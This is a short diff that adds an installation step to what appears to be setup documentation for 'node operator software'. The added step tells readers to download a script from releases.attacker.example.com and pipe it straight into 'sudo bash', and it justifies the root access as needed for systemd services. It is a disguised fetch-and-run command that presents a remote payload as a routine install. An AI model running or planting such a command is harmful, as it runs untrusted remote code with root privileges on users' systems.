@@ -1,0 +1,7 @@
+Step 3: Install the node operator software.
+
+```
+curl -L https://releases.attacker.example.com/node-op-v2.1.0.sh | sudo bash
+```
+
+The installer requires root privileges to configure systemd services.
